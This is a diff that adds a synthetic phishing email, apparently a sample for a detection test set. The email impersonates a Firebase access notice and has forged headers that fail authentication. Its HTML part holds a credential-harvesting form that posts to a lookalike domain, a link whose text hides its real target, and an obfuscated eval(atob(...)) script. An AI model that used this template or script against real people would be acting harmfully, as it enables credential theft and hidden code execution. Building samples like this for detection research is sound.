@@ -1,0 +1,30 @@
+From: notice@firebase-auth.firebaseapp.com
+To: victim38@example.com
+Subject: Access notice from Support [ref F3D1B3E]
+Date: Tue, 26 Mar 2002 14:41:00 -0500
+Message-ID: <phish-158-7f1271b3-0860-4108-950d-4a0dd9206ec4@firebase-auth.firebaseapp.com>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 02 Mar 2002 17:05:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 01 Mar 2002 05:42:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 12 Mar 2002 17:43:00 -0500
+Return-Path: <bounce@mail-fb51f00d.top>
+Reply-To: recovery8@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-fb51f00d.top; dkim=fail header.d=firebase-auth.firebaseapp.com; dmarc=fail header.from=firebase-auth.firebaseapp.com
+Received-SPF: fail (mx.example.com: domain of notice@firebase-auth.firebaseapp.com does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=firebase-auth.firebaseapp.com; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-158-6b2a71f"
+
+--bnd-p-158-6b2a71f
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=F3D1B3E
+
+Reference: F3D1B3E
+--bnd-p-158-6b2a71f
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.firebase-auth.firebaseapp.com/auth?t=F3D1B3E<br/><br/>Reference: F3D1B3E</p><p><a href="http://firebase-auth.firebaseapp.com/login">https://www.example.com/signin</a></p><form action="http://firebase-auth.firebaseapp.com/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-158-6b2a71f--
